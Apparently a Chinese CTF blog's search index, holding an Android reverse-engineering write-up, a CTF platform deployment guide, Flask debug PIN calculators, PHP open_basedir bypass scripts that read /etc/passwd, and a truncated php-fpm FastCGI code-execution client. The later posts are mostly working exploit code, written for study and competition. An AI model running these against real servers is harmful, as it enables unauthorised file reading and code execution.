= new OooO0OO(this.f1222OooO0o0);\n    String OooO0OO2 = OooO0OO();\n    this.f1220OooO0Oo = OooO0OO2;\n    this.f1219OooO0OO = this.f1221OooO0o.getWritableDatabase(OooO0OO2);\n    Cursor cursor = this.f1219OooO0OO.rawQuery(\"select * from test where num = '\" + i + \"'\", null);\n    this.OooO0oo = \"\";\n    if (cursor == null || !cursor.moveToFirst()) {\n        Toast.makeText(this.f1222OooO0o0, this.OooO0oo, 0).show();\n        cursor.close();\n        this.f1219OooO0OO.close();\n    }\n    do {\n        this.OooO0oo += cursor.getString(cursor.getColumnIndex(\"flag\")) + \"\\n\";\n    } while (cursor.moveToNext());\n    Toast.makeText(this.f1222OooO0o0, this.OooO0oo, 0).show();\n    cursor.close();\n    this.f1219OooO0OO.close();\n}\n```\n\n通过`OooO0OO`类的声明获得数据库文件的名称`data.db`\n\n```java\npublic class OooO0OO extends SQLiteOpenHelper {\n    public OooO0OO(Context context) {\n        super(context, \"data.db\", null, 1);\n    }\n\n    @Override // net.sqlcipher.database.SQLiteOpenHelper\n    public void onCreate(SQLiteDatabase sqLiteDatabase) {\n        sqLiteDatabase.execSQL(\"create table test(flag text, num text)\");\n    }\n\n    @Override // net.sqlcipher.database.SQLiteOpenHelper\n    public void onUpgrade(SQLiteDatabase sqLiteDatabase, int i, int i1) {\n        onCreate(sqLiteDatabase);\n    }\n}\n```\n\n改apk的后缀名然后解压文件，找到`data.db`文件\n\n使用`DB4S`打开db文件，发现需要密码\n\n\n获取`OooO0OO`函数的代码，发现先对`this.OooO0oO`中储存的数据进行base64解密\n然后将返回值作为参数执行`OooO00o.OooO00o`函数\n并将`OooO00o.OooO00o`函数的返回值作为参数调用`OooO00o`\n\n```java\npublic String OooO0OO() {\n    return OooO00o(new String(OooO00o.OooO00o(Base64.decode(this.OooO0oO, 0))));\n}\n```\n\n\n对`this.OooO0oO`查找用例，找到获取资源的代码\n\n```java\npublic String Oooo0o0() {\n    String flag = getSharedPreferences(\"secret\", 0).getString(\"flag\", null);\n    Log.i(\"secret\", \"读取信息\");\n    Log.i(\"secret\", \"flag:\" + flag);\n    return flag;\n}\n```\n\n搜索资源`secret`，获取到加密后的密码`mkrPETW43g1796lzN2dtiC5qgsC+ybJIWHR8GEzhsI4=`\n\n![](/img/wp/2022/2022vec-11.png)\n\n\n\n查看`OooO00o.OooO00o`函数的代码，发现是aes解密，密钥通过`OooO0O0`函数获取\n\n```java\npublic class OooO00o {\n    public static byte[] OooO00o(byte[] plainText) {\n        SecretKeySpec secretKey = new SecretKeySpec(OooO0O0(\"xGP_UACWNcWO]WNP\".getBytes(), \"123456\".getBytes()), \"AES\");\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        cipher.init(2, secretKey);\n        return cipher.doFinal(plainText);\n    }\n\n    public static byte[] OooO0O0(byte[] data, byte[] key) {\n        if (data == null || data.length == 0 || key == null || key.length == 0) {\n            return data;\n        }\n        byte[] result = new byte[data.length];\n        for (int i = 0; i < data.length; i++) {\n            result[i] = (byte) ((data[i] ^ key[i % key.length]) ^ (i & 255));\n        }\n        return result;\n    }\n}\n```\n\n通过脚本得到密钥``Itahdrtbu^hr`hsk``\n\n```python\na=b'xGP_UACWNcWO]WNP'\nb=b'123456'\ne=''\nfor i in range(len(a)):\n    e+=chr(a[i]^b[i%len(b)]^i)\n\nprint(e)\n```\n\naes解密得到`OooO00o`函数的参数`2>=9:92m;<in=?3n`\n\n![](/img/wp/2022/2022vec-12.png)\n\n\n将`f1218OooO0O0`变量的所有成员与参数的每一位异或`FECanfOI()*&<MNCXZPKL`\n\n```java\nstatic {\n    Charset forName = Charset.forName(\"UTF-8\");\n    OooO00o = forName;\n    f1218OooO0O0 = \"FECanfOI()*&<MNCXZPKL\".getBytes(forName);\n}\n\npublic static String OooO00o(String enc) {\n    byte[] b = enc.getBytes(OooO00o);\n    int size = b.length;\n    for (int i = 0; i < size; i++) {\n        for (byte keyBytes0 : f1218OooO0O0) {\n            b[i] = (byte) (b[i] ^ keyBytes0);\n        }\n    }\n    return new String(b);\n}\n```\n\n通过脚本解出数据库的密码`9562129f07be648e`\n\n```python\nkey=b\"FECanfOI()*&<MNCXZPKL\"\ndata=\"2>=9:92m;<in=?3n\"\nflag=''\nfor i in data:\n    c=i\n    for j in key:\n        c=c^j\n    flag+=chr(c)\nprint(flag)\n```\n\n进入数据库后发现表`test`中有一条特别的数据（与其他数据长度不一样），`fee0b212f413f8a0`\n\n根据长度猜测flag是密码加最后一条数据\n\n>flag{9562129f07be648efee0b212f413f8a0}","tags":["wp","2022竞赛","vec"],"categories":["wp"]},{"title":"ctf平台搭建与出题指南","url":"/posts/5ae46a89/","content":"\n\n# ctf平台搭建\n\n目前最常见的平台是CTFd和GZCTF\n\n## CTFd\n\n~~使用帆哥的[一键部署脚本](https://github.com/pwnthebox/ctfd-auto-deploy)（centos7和ubuntu20上测试成功）~~\n~~`sh <(curl -s https://raw.githubusercontent.com/pwnthebox/ctfd-auto-deploy/master/install.sh)`~~\n\n-------------\n\n2024.5.13\n帆哥github被封了，重构/优化了一下自动部署脚本\n\nhttps://github.com/dr0n1/CTFd_auto_deploy\n\n\n\n\n## GZCTF\n\n>适合办比赛（样式也好看），不适合自用和训练\n\n新建两个文件 appsettings.json 和 docker-compose.yml\n\n\n```json\n{\n  \"AllowedHosts\": \"*\",\n  \"ConnectionStrings\": {\n    \"Database\": \"Host=db:5432;Database=gzctf;Username=postgres;Password=<String1>\"\n      //<String1>换成数据库密码，随机密码且长度足够\n  },\n  \"Logging\": {\n    \"LogLevel\": {\n      \"Default\": \"Information\",\n      \"Microsoft\": \"Warning\",\n      \"Microsoft.Hosting.Lifetime\": \"Information\"\n    }\n  },\n    //邮箱配置\n  \"EmailConfig\": {\n    \"SendMailAddress\": \"Admin@xxx.com\",\t\t// 填入邮箱\n    \"UserName\": \"ctf_noreply\",\t\t\t\t    // 发件人名称\n    \"Password\": \"******\",                 // 邮箱密码，部分服务商需要填入授权码\n    \"Smtp\": {\n      \"Host\": \"smtp.163.com\",\t\t\t\t  // 此处为163邮箱服务器，具体自定\n      \"Port\": 465\n    }\n  },\n  \"XorKey\": \"<String2>\",\t\t\t\t\t    // 自定XorKey\n  \"ContainerProvider\": {\n    \"Type\": \"Docker\",\n    \"PublicEntry\": \"xx.xx.xx.xx\",\t\t\t// 域名或IP配置，用于容器生成,域名不带http/https\n    \"DockerConfig\": {\n      \"SwarmMode\": false,\n      \"Uri\": \"\"\t\t\t\t\t\t\t\t        // 本地配置Docker因此此处置空\n    }\n  },\n  \"RequestLogging\": false,\n  \"DisableRateLimit\": false,\n  \"RegistryConfig\": {\n    \"UserName\": \"\",\n    \"Password\": \"\",\n    \"ServerAddress\": \"\"\n  },\n\n    //谷歌验证码配置\n  \"GoogleRecaptcha\": {\n    \"VerifyAPIAddress\": \"https://www.recaptcha.net/recaptcha/api/siteverify\",\n    \"Sitekey\": \"\",\n    \"Secretkey\": \"\",\n    \"RecaptchaThreshold\": \"0.5\"\n  }\n}\n```\n\n```yml\nversion: '3.0'\nservices:\n  gzctf:\n    image: gztime/gzctf:latest\n    restart: always\n    environment:\n      - \"GZCTF_ADMIN_PASSWORD=<String3>\" # <String3>换成管理员账户密码，账号为Admin\n    ports:\n      - \"80:8080\" # 对外端口号，前为外部端口。\n    networks:\n      default:\n    volumes:\n      - \"./data/files:/app/uploads\"\n      - \"./appsettings.json:/app/appsettings.json:ro\"\n      - \"./logs:/app/log\"\n      - \"./data/keys:/root/.aspnet/DataProtection-Keys\"\n      # - \"./k8sconfig.yaml:/app/k8sconfig.yaml:ro\"\n      - \"/var/run/docker.sock:/var/run/docker.sock\"\n    depends_on:\n      - db\n\n  db:\n    image: postgres:alpine\n    restart: always\n    environment:\n      - \"POSTGRES_PASSWORD=<String1>\" # 数据库密码，务必要和appsettings.json中的配置一致\n    networks:\n      default:\n    volumes:\n      - \"./data/db:/var/lib/postgresql/data\"\n\nnetworks:\n  default:\n    driver: bridge\n    ipam:\n      config:\n        - subnet: 192.168.12.0/24\n```\n\n\n修改完配置文件后运行`docker-compose up -d`命令即可\n\n注意密码的设置一定要符合复杂性要求，否则会报错\n\n\n# 动态flag题目部署\n\n模板项目地址：https://github.com/dr0n1/CTF_Docker_Template\n\n包含pwn系列的ubuntu16，ubuntu18，ubuntu20，ubuntu22\nweb系列的php，java，python，go，mysql\nmisc，reverse系列的部分动态\n\n因为不会crypto，就没写交互的crypto\n\n## pwn题部署\n\n>包含了`ubuntu16`，`ubuntu18`，`ubuntu20`，`ubuntu22`四个基础模板\n\n\n假设现在出了一道pwn题，名字是baby_stack\n\n首先根据题目选择需要的Ubuntu版本，这里以Ubuntu16为例，下载`pwn_ubuntu16`这个模板\n\n把出好的二进制文件放到bin目录下，替换`test`\n然后找到`ctf.xinetd`文件中的`server_args`值，修改`test`为附件名\n\n![](/img/项目/ctfd-template-1.png)\n\n\n**第二步**，构建镜像\n在`Dockerfile`所在的目录运行`docker build -t <镜像名> .`\n运行后可以用`docker images`查看下是否成功生成了镜像\n\n![](/img/项目/ctfd-template-2.png)\n\n\n**第三步**，本地测试或CTFd部署\n>本地测试这步可选，没有信心一次成功的话可以先在本地测试下\n\n运行`docker run -itd -p <对外暴露端口>:9999 <镜像名> /start.sh`\n\n![](/img/项目/ctfd-template-3.png)\n\n![](/img/项目/ctfd-template-4.png)\n\n\nnc连接后能返回程序的功能就ok了(别忘记删除容器)\n接着在CTFd上部署，注意type选择direct，image与port对应即可\n\n![](/img/项目/ctfd-template-5.png)\n\n\n\n\n## web题部署\n\n### php\n\n>包含了`web_apache-mysql-php5.5`，`web_apache-mysql-php7.3`，`web_apache-php5.5`，`web_apache-php7.3` 四个php模板。（如果需要其他版本的php环境，替换Dockerfile中的FROM命令即可）\n\n1：将题目放入`src`目录下\n2：将需要导入数据库的数据写入`data`目录下的data.sql\n3：根据题目选择flag位置，然后修改`start.sh`\n4：docker build\n\n在sql环境中注意替换flag位置即可（要一一对应）\n\n![](/img/项目/ctfd-template-8.png)\n\n\n如果需要使用php扩展，则修改或增加Dockerfile文件中的docker-php-ext-install命令即可\n\n\n```bash\n# 基于thinkphp等框架的源码则需要在start.sh中添加 更改网页根目录 的代码，并根据手册安装对应依赖和拓展\n# 仅供参考\nsed -i 's/DocumentRoot \\/var\\/www\\/html/DocumentRoot \\/var\\/www\\/html\\/public/' /etc/apache2/sites-available/000-default.conf\n```\n\n\n\n### python\n\n>包含了`web_flask-python2.7`，`web_flask-python3.10` 两个python模板\n\n\n1：src中存放题目代码，注意命名app.py。如果使用了除flask外的第三方库，请在requirements.txt中标明\n2：默认启动时不启用debug模式，如需要启用debug模式请修改start.sh\n\n![](/img/项目/ctfd-template-9.png)\n\n\n\n\n\n\n\n\n\n## misc题部署\n\n>包含了`misc_python2.7`，`misc_python3.9`两个镜像模板。利用`http.server`，`SimpleHTTPServer`和`httpd`启动一个web服务用来下载附件\n\n>个人认为动态misc的核心思路就是把出题过程转换为一个脚本，然后读取平台传递的flag后生成附件，利用web服务下载。所以部分工具题和复杂一点的题目是没有办法出动态的\n\n\n还是先根据需求选择不同的环境，这里以`misc_python3.9`为例\n\n**第一步**，先将出题思路写进一个脚本中，命名为`challenges.py`，所需的模块放到`requirements.txt`中\n\n这个脚本有几点需要注意：\n1：需要从`/flag`读取flag值\n2：出题后生成的附件需要套一层压缩包以便访问自动下载，zip需要命名为`attachment.zip`\n3：尽量在脚本结束时删除无用的文件\n\n以下是一个简单的例子\n\n```python\nimport random\nimport pyminizip\nimport os\nfrom PIL import Image,ImageDraw,ImageOps\n\n\nf=open('/flag')\nflag=f.read()\n\na=Image.new(\"1\",(300,20))\nw,h=a.size\nd=ImageDraw.Draw(a)\nd.text((0,0),flag,fill=255)\na = ImageOps.invert(a)\na.save('1.png')\n\n\npassword = ''.join(random.choices('0123456789', k=8))\npyminizip.compress(\"1.png\", None, \"attachment.zip\", password, 5)\nos.remove(\"1.png\")\n```\n\n\n**第二步**，将代码放进`files`目录，然后生成镜像\n\n![](/img/项目/ctfd-template-6.png)\n\n\n**第三步**，在CTFd上部署，然后验证\n\n部署时端口选择80\n\n开启靶机后访问，如果没出问题的话应该只会弹出一个保存文件的窗口，且能成功下载\n\n![](/img/项目/ctfd-template-7.png)\n\n下载到本地后就可以正常解题\n\n\n# docker in qemu in docker\n\n常见于docker逃逸题目的部署\ndocker（deploy）-> qemu（flag）-> docker（attack）\n\n如果用了kvm则要注意kvm的映射\n\n```docker\ndocker build -t docker-escaper .\ndocker run -itd -p 5555:5555 --device /dev/kvm  -v /dev/kvm:/dev/kvm  docker-escaper\n```\n\n没有kvm的解决方法\n\n```bash\n# 检查cpu是否支持\napt install cpu-check\nkvm-ok\n\n# 如果支持则可以继续\napt install qemu qemu-kvm libvirt-clients libvirt-daemon-system bridge-utils virt-manager libguestfs-tools\nsudo systemctl enable --now libvirtd\nsudo systemctl enable --now virtlogd\necho 1 | sudo tee /sys/module/kvm/parameters/ignore_msrs\nsudo modprobe kvm\n```\n\n\n# 总结\n\n一定要灵活使用dockerfile，不同题目根据**需求**做不同策略\n\n\n","tags":["平台搭建部署","docker","自动化","自研工具"],"categories":["项目"]},{"title":"flask算pin","url":"/posts/564e35d3/","content":"\n\nflask在开启debug模式后会启动调试模式，一般为`/console`，需要正确的PIN码才能进入\n\n\n**python3.8和python3.6生成PIN的算法不同**\n\n算法代码在`site-packages/werkzeug/debug/__init__.py`\n\n\n\n# 需要的信息\n\n\n|  | 代码中 | 文件中 |\n| ---- | ---- | ---- |\n| username  | getpass.getuser() | /etc/passwd |\n| modname  | getattr(mod, \"\\_\\_file\\_\\_\", None) | 默认值为flask.app |\n| appname  | getattr(app, \"\\_\\_name\\_\\_\", type(app).\\_\\_name\\_\\_) | 默认值为Flask |\n| moddir  | getattr(mod, \"\\_\\_file\\_\\_\", None) | 报错读取 |\n| uuidnode | uuid.getnode() | /sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算 |\n| machine_id | get_machine_id() | linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id，docker靶机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id，在docker环境下读取后两个，非docker环境三个都需要读取 |\n\n\n# 3.6\n\n```python\n#MD5\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n     'flaskweb'# username\n     'flask.app',# modname\n     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address\n     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n   h.update(b'pinsalt')\n   num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n   for group_size in 5, 4, 3:\n       if len(num) % group_size == 0:\n          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                      for x in range(0, len(num), group_size))\n          break\n       else:\n          rv = num\n\nprint(rv)\n```\n\n\n\n\n# 3.8\n\n```python\n#sha1\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# /etc/passwd\n    'flask.app',# 默认值\n    'Flask',# 默认值\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到\n]\n\nprivate_bits = [\n    '2485377600896',#  /sys/class/net/eth0/address 16进制转10进制\n    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n    '225374fa-04bc-4346-9f39-48fa82829ca9a57bc49ae880a291711cb100aba12025c1e666fb86db4712f78c31ed557320c4'\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n","tags":["flask","python"],"categories":["python"]},{"title":"php绕过open_basedir","url":"/posts/3e5549a6/","content":"\nopen_basedir一般用来限制跨目录读写文件\n\nphp绕过open_basedir是一个古老的漏洞，在2009年左右就被提出来了\n\n\n\n# glob://\n\nopendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目。\n\n这里结合两个函数来列举根目录中的文件：\n\n\n```php\n$a=\"glob:///*\";\nif ( $b = opendir($a) ) {\n    while ( ($file = readdir($b)) !== false ) {\n        echo $file.\"<br>\";\n    }\n    closedir($b);\n}\n```\n\n使用DirectoryIterator的效果是一样的\n\n```php\n$c=\"glob:///*\";\n$a = new DirectoryIterator($c);\nforeach($a as $f){\n    echo($f->__toString().'<br>');\n}\n```\n\n\n局限性：不能列举出其他非根目录和open_basedir指定的目录中的文件\n\n将`glob:///*`改为`glob:///*/www/../*`即可读取var目录\n\n同样的\n`glob:///*/www/*`可以读取/var/www目录\n`glob:///*/www/html/*`读取/var/www/html目录\n\n\n\n# chdir()与ini_set()组合\n\n这种利用方式跟open_basedir存在缺陷的处理逻辑有关\n\n通过跳转和设置open_basedir实现绕过\n\n\n```php\nmkdir('1');chdir('1');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/etc/passwd');\n\n//var_dump(scandir('/'));\n//readfile('/flag');\n```\n\n\n\n\n# symlink()\n\n\n```php\n<?php\nmkdir(\"A\");\nchdir(\"A\");\nmkdir(\"B\");\nchdir(\"B\");\nmkdir(\"C\");\nchdir(\"C\");\nmkdir(\"D\");\nchdir(\"D\");\nchdir(\"..\");\nchdir(\"..\");\nchdir(\"..\");\nchdir(\"..\");\nsymlink(\"A/B/C/D\",\"xx\");\nsymlink(\"xx/../../../../etc/passwd\",\"exp\");\nunlink(\"xx\");\nmkdir(\"xx\");\n?>\n```\n\n访问后会生成一个名为exp的文件，内容就是/etc/passwd\n\n原理：创建一个链接文件xx，用相对路径指向A/B/C/D，再创建一个链接文件exp指向xx/../../../../etc/passwd。其实指向的就是A/B/C/D/../../../../etc/passwd，其实就是/etc/passwd。这时候删除xx，再创建一个xx目录，但exp还是指向xx/../../../etc/passwd，所以就成功跨到/etc/passwd了。（需要跨越几层就创建几层目录）\n\n\n\np牛的脚本\n\n```php\n<?php\n/*\n* by phithon\n* From https://www.leavesongs.com\n* detail: http://cxsecurity.com/issue/WLB-2009110068\n*/\nheader('content-type: text/plain');\nerror_reporting(-1);\nini_set('display_errors', TRUE);\nprintf(\"open_basedir: %s\\nphp_version: %s\\n\", ini_get('open_basedir'), phpversion());\nprintf(\"disable_functions: %s\\n\", ini_get('disable_functions'));\n$file = str_replace('\\\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');\n$relat_file = getRelativePath(__FILE__, $file);\n$paths = explode('/', $file);\n$name = mt_rand() % 999;\n$exp = getRandStr();\nmkdir($name);\nchdir($name);\nfor($i = 1 ; $i < count($paths) - 1 ; $i++){\n    mkdir($paths[$i]);\n    chdir($paths[$i]);\n}\nmkdir($paths[$i]);\nfor ($i -= 1; $i > 0; $i--) { \n    chdir('..');\n}\n$paths = explode('/', $relat_file);\n$j = 0;\nfor ($i = 0; $paths[$i] == '..'; $i++) { \n    mkdir($name);\n    chdir($name);\n    $j++;\n}\nfor ($i = 0; $i <= $j; $i++) { \n    chdir('..');\n}\n$tmp = array_fill(0, $j + 1, $name);\nsymlink(implode('/', $tmp), 'tmplink');\n$tmp = array_fill(0, $j, '..');\nsymlink('tmplink/' . implode('/', $tmp) . $file, $exp);\nunlink('tmplink');\nmkdir('tmplink');\ndelfile($name);\n$exp = dirname($_SERVER['SCRIPT_NAME']) . \"/{$exp}\";\n$exp = \"http://{$_SERVER['SERVER_NAME']}{$exp}\";\necho \"\\n-----------------content---------------\\n\\n\";\necho file_get_contents($exp);\ndelfile('tmplink');\n\nfunction getRelativePath($from, $to) {\n  // some compatibility fixes for Windows paths\n  $from = rtrim($from, '\\/') . '/';\n  $from = str_replace('\\\\', '/', $from);\n  $to   = str_replace('\\\\', '/', $to);\n\n  $from   = explode('/', $from);\n  $to     = explode('/', $to);\n  $relPath  = $to;\n\n  foreach($from as $depth => $dir) {\n    // find first non-matching dir\n    if($dir === $to[$depth]) {\n      // ignore this directory\n      array_shift($relPath);\n    } else {\n      // get number of remaining dirs to $from\n      $remaining = count($from) - $depth;\n      if($remaining > 1) {\n        // add traversals up to first matching dir\n        $padLength = (count($relPath) + $remaining - 1) * -1;\n        $relPath = array_pad($relPath, $padLength, '..');\n        break;\n      } else {\n        $relPath[0] = './' . $relPath[0];\n      }\n    }\n  }\n  return implode('/', $relPath);\n}\n\nfunction delfile($deldir){\n    if (@is_file($deldir)) {\n        @chmod($deldir,0777);\n        return @unlink($deldir);\n    }else if(@is_dir($deldir)){\n        if(($mydir = @opendir($deldir)) == NULL) return false;\n        while(false !== ($file = @readdir($mydir)))\n        {\n            $name = File_Str($deldir.'/'.$file);\n            if(($file!='.') && ($file!='..')){delfile($name);}\n        } \n        @closedir($mydir);\n        @chmod($deldir,0777);\n        return @rmdir($deldir) ? true : false;\n    }\n}\n\nfunction File_Str($string)\n{\n    return str_replace('//','/',str_replace('\\\\','/',$string));\n}\n\nfunction getRandStr($length = 6) {\n    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $randStr = '';\n    for ($i = 0; $i < $length; $i++) {\n        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);\n    }\n    return $randStr;\n}\n```\n\n上传到服务器后GET传`file=xxx`即可实现绕过open_basedir来读取文件\n\n\n# php-fpm\n\n在攻击php-fpm的基础上对 open_basedir 进行重设(对于php-fpm的攻击原理我单独写了一篇[总结](/posts/21a69435))\n\n`'PHP_VALUE': 'auto_prepend_file = php://input'+chr(0x0A)+'open_basedir = /',`\n\n\n\n```python\nimport socket\nimport random\nimport argparse\nimport sys\nfrom io import BytesIO\n\n# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\n\nPY2 = True if sys.version_info.major == 2 else False\n\n\ndef bchr(i):\n    if PY2:\n        return force_bytes(chr(i))\n    else:\n        return bytes([i])\n\n\ndef bord(c):\n    if isinstance(c, int):\n        return c\n    else:\n        return ord(c)\n\n\ndef force_bytes(s):\n    if isinstance(s, bytes):\n        return s\n    else:\n        return s.encode('utf-8', 'strict')\n\n\ndef force_text(s):\n    if issubclass(type(s), str):\n        return s\n    if isinstance(s, bytes):\n        s = str(s, 'utf-8', 'strict')\n    else:\n        s = str(s)\n    return s\n\n\nclass FastCGIClient:\n    \"\"\"A Fast-CGI Client for Python\"\"\"\n\n    # private\n    __FCGI_VERSION = 1\n\n    __FCGI_ROLE_RESPONDER = 1\n    __FCGI_ROLE_AUTHORIZER = 2\n    __FCGI_ROLE_FILTER = 3\n\n    __FCGI_TYPE_BEGIN = 1\n    __FCGI_TYPE_ABORT = 2\n    __FCGI_TYPE_END = 3\n    __FCGI_TYPE_PARAMS = 4\n    __FCGI_TYPE_STDIN = 5\n    __FCGI_TYPE_STDOUT = 6\n    __FCGI_TYPE_STDERR = 7\n    __FCGI_TYPE_DATA = 8\n    __FCGI_TYPE_GETVALUES = 9\n    __FCGI_TYPE_GETVALUES_RESULT = 10\n    __FCGI_TYPE_UNKOWNTYPE = 11\n\n    __FCGI_HEADER_SIZE = 8\n\n    # request state\n    FCGI_STATE_SEND = 1\n    FCGI_STATE_ERROR = 2\n    FCGI_STATE_SUCCESS = 3\n\n    def __init__(self, host, port, timeout, keepalive):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        if keepalive:\n            self.keepalive = 1\n        else:\n            self.keepalive = 0\n        self.sock = None\n        self.requests = dict()\n\n    def __connect(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.settimeout(self.timeout)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        # if self.keepalive:\n        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n        # else:\n        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\n        try:\n            self.sock.connect((self.host, int(self.port)))\n        except socket.error as msg:\n            self.sock.close()\n            self.sock = None\n            print(repr(msg))\n            return False\n        return True\n\n    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):\n        length = len(content)\n        buf = bchr(FastCGIClient.__FCGI_VERSION) \\\n              + bchr(fcgi_type) \\\n              + bchr((requestid >> 8) & 0xFF) \\\n              + bchr(requestid & 0xFF) \\\n              + bchr((length >> 8) & 0xFF) \\\n              + bchr(length & 0xFF) \\\n              + bchr(0) \\\n              + bchr(0) \\\n              + content\n        return buf\n\n    def __encodeNameValueParams(self, name, value):\n        nLen = len(name)\n        vLen = len(value)\n        record = b''\n        if nLen < 128:\n            record += bchr(nLen)\n        else:\n            record += bchr((nLen >> 24) | 0x80) \\\n                      + bchr((nLen >> 16) & 0xFF) \\\n                      + bchr((nLen >> 8) & 0xFF) \\\n                      + bchr(nLen & 0xFF)\n        if vLen < 128:\n            record += bchr(vLen)\n        else:\n            record += bchr((vLen >> 24) | 0x80) \\\n                      + bchr((vLen >> 16) & 0xFF) \\\n                      + bchr((vLen >> 8) & 0xFF) \\\n                      + bchr(vLen & 0xFF)\n        return record + name + value\n\n    def __decodeFastCGIHeader(self, stream):\n        header = dict()\n        header['version'] = bord(stream[0])\n        header['type'] = bord(stream[1])\n        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])\n        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])\n        header['paddingLength'] = bord(stream[6])\n        header['reserved'] = bord(stream[7])\n        return header\n\n    def __decodeFastCGIRecord(self, buffer):\n        header = buffer.read(int(self.__FCGI_HEADER_SIZE))\n\n        if not header:\n            return False\n        else:\n            record = self.__decodeFastCGIHeader(header)\n            record['content'] = b''\n\n            if 'contentLength' in record.keys():\n                contentLength = int(record['contentLength'])\n                record['content'] += buffer.read(contentLength)\n            if 'paddingLength' in record.keys():\n                skiped = buffer.read(int(record['paddingLength']))\n            return record\n\n    def request(self, nameValuePairs={}, post=''):\n        if not self.__connect():\n            print('connect failure! please check your fasctcgi-server !!')\n            return\n\n        requestId = random.randint(1, (1 << 16) - 1)\n        self.requests[requestId] = dict()\n        request = b\"\"\n        beginFCGIRecordContent = bchr(0) \\\n                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n                                 + bchr(self.keepalive) \\\n                                 + bchr(0) * 5\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\n                                              beginFCGIRecordContent, requestId)\n        paramsRecord = b''\n        if nameValuePairs:\n            for (name, value) in nameValuePairs.items():\n                name = force_bytes(name)\n                value = force_bytes(value)\n                paramsRecord += self.__encodeNameValueParams(name, value)\n\n        if paramsRecord:\n            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\n\n        if post:\n            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\n\n        self.sock.send(request)\n        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\n        self.requests[requestId]['response'] = b''\n        return self.__waitForResponse(requestId)\n\n    def __waitForResponse(self, requestId):\n        data = b''\n        while True:\n            buf = self.sock.recv(512)\n            if not len(buf):\n                break\n            data += buf\n\n        data = BytesIO(data)\n        while True:\n            response = self.__decodeFastCGIRecord(data)\n            if not response:\n                break\n            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\n                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\n                if requestId == int(response['requestId']):\n                    self.requests[requestId]['response'] += response['content']\n            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\n                self.requests[requestId]\n        return self.requests[requestId]['response']\n\n    def __repr__(self):\n        return \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\n    parser.add_argument('host', help='Target host, such as 127.0.0.1')\n    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\n    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')\n    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\n\n    args = parser.parse_args()\n\n    client = FastCGIClient(args.host, args.port, 3, 0)\n    params = dict()\n    documentRoot = \"/\"\n    uri = args.file\n    content = args.code\n    params = {\n        'GATEWAY_INTERFACE': 